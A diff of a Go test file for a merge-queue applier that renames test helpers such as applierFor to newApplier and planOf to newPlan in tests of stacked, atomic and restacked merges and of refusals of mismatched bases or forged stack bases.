@@ -1305,9 +1305,9 @@ func TestAMarkThatFailsIsANoticeAndApplyingGoesOn(t *testing.T) {
 	marks := d.marks(map[string]error{"1 queued": errors.New("labels down")})
 	d.cleanMerge(v, types.MergeResult{})
 	var out bytes.Buffer
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	a.Events = NewEvents(&out)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 	assert.Contains(t, out.String(), `"kind":"notice","change":"1","reason":"could not mark #1 queued: labels down"`)
 	assert.Contains(t, out.String(), `"kind":"merged","change":"1"`)
 	assert.Equal(t, []string{"1 queued", "1 none"}, marks.entries())
@@ -1320,8 +1320,8 @@ func TestAChangeRetargetedAfterPlanningIsSkippedWithoutRetargeting(t *testing.T)
 	d.bases(base)
 	d.rechecks(c, types.Approval{Approved: true, Head: c.Head, Base: "release", Method: types.MethodSquash, Queued: true})
 	d.waits(c, c.Head, "targets release, not main; skipped")
-	a := applierFor(t, d, planOf([]types.Change{c}), validated(c, base, ""))
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), validated(c, base, ""))
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
 
 // I19 through the provider: an atomic provider merges a run of stacked changes in one
@@ -1340,7 +1340,7 @@ func (d doubles) atomicStack() atomicStack {
 	s.two = stacked("2", s.one, "a")
 	s.v1 = validated(s.one, base, "")
 	s.v2 = validated(s.two, s.v1.CandidateCommit, "1")
-	s.plan = planOf([]types.Change{s.one, s.two})
+	s.plan = newPlan([]types.Change{s.one, s.two})
 	d.provider.EXPECT().Describe(mock.Anything, applyQuery).
 		Return(types.Capabilities{StackMerge: types.StackMergeAtomic, Methods: []types.MergeMethod{types.MethodSquash}}, nil)
 	d.bases(base)
@@ -1372,7 +1372,7 @@ func (d doubles) mergesAtomically(s atomicStack, err error) *mock.Call {
 	one := d.green(s.one, s.one.Head)
 	two := d.green(s.two, s.two.Head)
 	d.squashes(s.two)
-	return d.provider.EXPECT().MergeChange(mock.Anything, mock.Anything, types.MergeOptions{Commit: s.two.Head, Message: squashOf(s.v2.Change),
+	return d.provider.EXPECT().MergeChange(mock.Anything, mock.Anything, types.MergeOptions{Commit: s.two.Head, Message: expectedSquash(s.v2.Change),
 		Through: []types.PinnedChange{{ID: "1", Commit: s.one.Head}}}).Return(types.MergeResult{}, err).NotBefore(one, two)
 }
 
@@ -1397,7 +1397,7 @@ func TestAnAtomicProviderMergesAStackRunInOneCallWithEveryMemberPinned(t *testin
 	d.mergesAtomically(s, nil)
 	after := oid("after")
 	d.squashedOnto(after, head("s1"), after)
-	a := applierFor(t, d, s.plan, s.v1, s.v2)
+	a := newApplier(t, d, s.plan, s.v1, s.v2)
 	require.NoError(t, a.Run(t.Context(), s.plan))
 }
 
@@ -1410,7 +1410,7 @@ func TestAnAtomicRunThatMergesPartwayStopsApplying(t *testing.T) {
 	after := oid("after")
 	d.squashedOnto(after, after)
 	d.status(s.two, s.two.Head, types.StatePending, "waiting: applying stopped before its merge: stack through #2 merged 1 of 2").NotBefore(merge)
-	a := applierFor(t, d, s.plan, s.v1, s.v2)
+	a := newApplier(t, d, s.plan, s.v1, s.v2)
 	err := a.Run(t.Context(), s.plan)
 	require.EqualError(t, err, "stack through #2 merged 1 of 2 changes: stopped after #1")
 }
@@ -1425,7 +1425,7 @@ func TestAnAtomicMemberThatMovedIsNotMergedAndHoldsWhatIsAboveIt(t *testing.T) {
 		Return(types.Approval{Approved: true, Head: moved, Base: "main", Method: types.MethodSquash, Queued: true}, nil).Once()
 	d.waits(s.one, moved, "head moved to "+moved[:12]+" before its merge")
 	d.waits(s.two, s.two.Head, "stacked on #1, which did not merge")
-	a := applierFor(t, d, s.plan, s.v1, s.v2)
+	a := newApplier(t, d, s.plan, s.v1, s.v2)
 	require.NoError(t, a.Run(t.Context(), s.plan))
 }
 
@@ -1610,7 +1610,7 @@ func TestARestackCommitIsTheQueuesAndNamesWhatItReplaces(t *testing.T) {
 	c := change("1", "a")
 	c.StackBase, c.Branch = m.Head, "feature"
 	v := validated(c, base, "")
-	plan := planOf([]types.Change{c})
+	plan := newPlan([]types.Change{c})
 	plan.Merged = []types.MergedChange{m}
 
 	d := newDoubles(t)
@@ -1626,8 +1626,8 @@ func TestARestackCommitIsTheQueuesAndNamesWhatItReplaces(t *testing.T) {
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
 	d.bases(base, after)
 	d.green(c, update)
-	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base)
-	a := applierFor(t, d, plan, v)
+	d.mergesAt(c, update, expectedSquash(v.Change), after, "validated", base)
+	a := newApplier(t, d, plan, v)
 	require.NoError(t, a.Run(t.Context(), plan))
 }
 
@@ -1639,7 +1639,7 @@ func TestARestackThatWouldOrphanAChangeAboveIsKickedBack(t *testing.T) {
 	c.StackBase, c.Branch = m.Head, "feature"
 	above := stacked("2", c, "a")
 	v := validated(c, base, "")
-	plan := planOf([]types.Change{c, above})
+	plan := newPlan([]types.Change{c, above})
 	plan.Merged = []types.MergedChange{m}
 
 	d := newDoubles(t)
@@ -1648,7 +1648,7 @@ func TestARestackThatWouldOrphanAChangeAboveIsKickedBack(t *testing.T) {
 	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, c.Head, above.Head).Return(true, nil)
 	d.kicks(c, types.CodeKickRefused, "which would replace the commits #2 is stacked on")
 	d.waits(above, above.Head, "not validated in this run")
-	a := applierFor(t, d, plan, v)
+	a := newApplier(t, d, plan, v)
 	require.NoError(t, a.Run(t.Context(), plan))
 }
 
@@ -1662,7 +1662,7 @@ func TestAStackedChangeTargetingTheBranchBeneathIsRetargetedOnceThatMergedAndMer
 	v2 := validated(two, v1.CandidateCommit, "1")
 	cand1, cand2 := v1.CandidateCommit, v2.CandidateCommit
 	after1, after2 := oid("after", "1"), oid("after", "2")
-	plan := planOf([]types.Change{one, two})
+	plan := newPlan([]types.Change{one, two})
 
 	d := newDoubles(t)
 	d.caps()
@@ -1685,8 +1685,8 @@ func TestAStackedChangeTargetingTheBranchBeneathIsRetargetedOnceThatMergedAndMer
 	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: after1, Theirs: two.Head}).Return(magustypes.TreeMergeResult{Tree: "tree 2"}, nil)
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, two.Head).Return(approvedAs(two), nil).Once()
 	d.green(two, two.Head)
-	d.mergesAt(two, two.Head, squashOf(v2.Change), after2, "tree 2", after1).NotBefore(retarget)
-	a := applierFor(t, d, plan, v1, v2)
+	d.mergesAt(two, two.Head, expectedSquash(v2.Change), after2, "tree 2", after1).NotBefore(retarget)
+	a := newApplier(t, d, plan, v1, v2)
 	require.NoError(t, a.Run(t.Context(), plan))
 }
 
@@ -1742,18 +1742,18 @@ func TestApplyProvesAReviewAcrossAMergeOfTheBaseByRegenerating(t *testing.T) {
 				d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
 				d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
 				d.green(c, c.Head)
-				d.mergesAt(c, c.Head, squashOf(v.Change), after, "validated", base)
+				d.mergesAt(c, c.Head, expectedSquash(v.Change), after, "validated", base)
 			} else {
 				d.bases(base)
 				d.waits(c, c.Head, "not approved at "+c.Head[:12]+": `gen/x.go` are not what the base's regeneration makes of its plain merge")
 			}
 			var ran []types.Regeneration
-			a := applierFor(t, d, planOf([]types.Change{c}), v)
+			a := newApplier(t, d, newPlan([]types.Change{c}), v)
 			a.Regenerate = func(_ context.Context, r types.Regeneration) error {
 				ran = append(ran, r)
 				return nil
 			}
-			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+			require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 			require.Len(t, ran, 1)
 			assert.Equal(t, []string{"gen/x.go"}, ran[0].Paths)
 			assert.Equal(t, []string{"gen"}, ran[0].Units)
@@ -1778,7 +1778,7 @@ func TestApplyCarriesAnApprovalOverARebaseAgainstThePlansChanges(t *testing.T) {
 		t.Run(name, func(t *testing.T) {
 			c := change("1", "a")
 			v := validated(c, base, "")
-			plan := planOf([]types.Change{c})
+			plan := newPlan([]types.Change{c})
 			plan.Merged, plan.Unqueued = []types.MergedChange{m}, []types.UnqueuedChange{u}
 			d := newDoubles(t)
 			d.caps()
@@ -1804,12 +1804,12 @@ func TestApplyCarriesAnApprovalOverARebaseAgainstThePlansChanges(t *testing.T) {
 				d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
 				d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
 				d.green(c, c.Head)
-				d.mergesAt(c, c.Head, squashOf(v.Change), after, "validated", base)
+				d.mergesAt(c, c.Head, expectedSquash(v.Change), after, "validated", base)
 			} else {
 				d.bases(base)
 				d.waits(c, c.Head, "approval at "+c.Head[:12]+" was withdrawn: stale")
 			}
-			a := applierFor(t, d, plan, v)
+			a := newApplier(t, d, plan, v)
 			a.Events = NewEvents(&out)
 			require.NoError(t, a.Run(t.Context(), plan))
 			assert.Equal(t, tc.carried, strings.Contains(out.String(), "rebased with its diff unchanged, so its approval carried over"))
@@ -1838,7 +1838,7 @@ func TestApplyRefusesAStatusPinnedToAnotherIntegration(t *testing.T) {
 			a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
 			require.NoError(t, err)
 			a.Base, a.App = "main", tc.app
-			err = a.Run(t.Context(), planOf([]types.Change{change("1", "a")}))
+			err = a.Run(t.Context(), newPlan([]types.Change{change("1", "a")}))
 			var diag *magustypes.DiagnosticError
 			require.ErrorAs(t, err, &diag)
 			assert.Equal(t, magustypes.QueueCredentialMismatch, diag.Code)
@@ -1890,13 +1890,13 @@ func TestApplyRefusesAPlanForAnotherBaseOrRemote(t *testing.T) {
 			a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
 			require.NoError(t, err)
 			a.Base, a.RemoteURL = tc.base, tc.remote
-			requireUnverified(t, a.Run(t.Context(), planOf([]types.Change{c})), tc.want)
+			requireUnverified(t, a.Run(t.Context(), newPlan([]types.Change{c})), tc.want)
 		})
 	}
 	d := newDoubles(t)
 	a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
 	require.NoError(t, err)
-	require.EqualError(t, a.Run(t.Context(), planOf([]types.Change{c})), "applier needs the base branch it merges into")
+	require.EqualError(t, a.Run(t.Context(), newPlan([]types.Change{c})), "applier needs the base branch it merges into")
 }
 
 // Every candidate was built on the plan's base commit; a base that does not carry it is
@@ -1908,8 +1908,8 @@ func TestApplyRefusesABaseThatDoesNotCarryThePlansBaseCommit(t *testing.T) {
 	d.caps()
 	d.bases(rewritten)
 	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, rewritten).Return(false, nil).Once()
-	a := applierFor(t, d, planOf([]types.Change{c}), validated(c, base, ""))
-	requireUnverified(t, a.Run(t.Context(), planOf([]types.Change{c})), "the plan's base commit "+base[:12]+" is not on main at "+rewritten[:12])
+	a := newApplier(t, d, newPlan([]types.Change{c}), validated(c, base, ""))
+	requireUnverified(t, a.Run(t.Context(), newPlan([]types.Change{c})), "the plan's base commit "+base[:12]+" is not on main at "+rewritten[:12])
 }
 
 // A stack base is where the delta a change's reviewers approved starts. Merging from any
@@ -1940,8 +1940,8 @@ func TestApplyRefusesAStackBaseThatIsNotTheReviewedHeadBeneath(t *testing.T) {
 			one := change("1", "a")
 			two := stacked("2", one, "a")
 			two.StackBase = forged
-			v1, v2 := validated(one, base, ""), validated(two, candidateOf(base, one.Head), "1")
-			plan := planOf([]types.Change{one, two})
+			v1, v2 := validated(one, base, ""), validated(two, candidateID(base, one.Head), "1")
+			plan := newPlan([]types.Change{one, two})
 			d.caps()
 			d.cleanMerge(v1, types.MergeResult{})
 			after := oid("after", "1")
@@ -1949,7 +1949,7 @@ func TestApplyRefusesAStackBaseThatIsNotTheReviewedHeadBeneath(t *testing.T) {
 			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, after).Return(true, nil).Once()
 			d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, two.Head).Return(nil).Once()
 			tc.answer(d, two)
-			a := applierFor(t, d, plan, v1, v2)
+			a := newApplier(t, d, plan, v1, v2)
 			requireUnverified(t, a.Run(t.Context(), plan), "the plan's stack of #2: "+tc.want)
 		})
 	}
@@ -1970,8 +1970,8 @@ func TestApplyRefusesAStackBaseNoMergedChangeHolds(t *testing.T) {
 	d.lists(types.Changes{Base: "main", Changes: []types.Change{c}, Merged: []types.MergedChange{m}})
 	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, m.Head).Return(nil).Once()
 	d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, m.Head, []string(nil)).Return([]magustypes.Commit{{ID: m.Head, Parents: []string{base}}}, nil).Once()
-	plan := planOf([]types.Change{c})
-	a := applierFor(t, d, plan, validated(c, base, ""))
+	plan := newPlan([]types.Change{c})
+	a := newApplier(t, d, plan, validated(c, base, ""))
 	requireUnverified(t, a.Run(t.Context(), plan), "stack base "+c.StackBase[:12]+" is neither the head of a change beneath it nor a commit of one the provider lists as merged")
 }
 
@@ -1981,8 +1981,8 @@ func TestAStackTheProviderNowDeclaresDifferentlyWaits(t *testing.T) {
 	d := newDoubles(t)
 	one := change("1", "a")
 	two := stacked("2", one, "a")
-	v1, v2 := validated(one, base, ""), validated(two, candidateOf(base, one.Head), "1")
-	plan := planOf([]types.Change{one, two})
+	v1, v2 := validated(one, base, ""), validated(two, candidateID(base, one.Head), "1")
+	plan := newPlan([]types.Change{one, two})
 	d.caps()
 	d.cleanMerge(v1, types.MergeResult{})
 	after := oid("after", "1")
@@ -1994,7 +1994,7 @@ func TestAStackTheProviderNowDeclaresDifferentlyWaits(t *testing.T) {
 	moved.Parent = "5"
 	d.lists(types.Changes{Base: "main", Changes: []types.Change{moved}})
 	d.waits(two, two.Head, "the provider now says it is stacked on #5, not #1")
-	a := applierFor(t, d, plan, v1, v2)
+	a := newApplier(t, d, plan, v1, v2)
 	require.NoError(t, a.Run(t.Context(), plan))
 }
 
@@ -2011,6 +2011,6 @@ func TestTheSquashMessageIsApplyingsOwnWhateverTheVerdictCarries(t *testing.T) {
 	require.NoError(t, err)
 	d.caps()
 	d.cleanMerge(v, types.MergeResult{})
-	a := applierFor(t, d, planOf([]types.Change{c}), v)
-	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
+	a := newApplier(t, d, newPlan([]types.Change{c}), v)
+	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
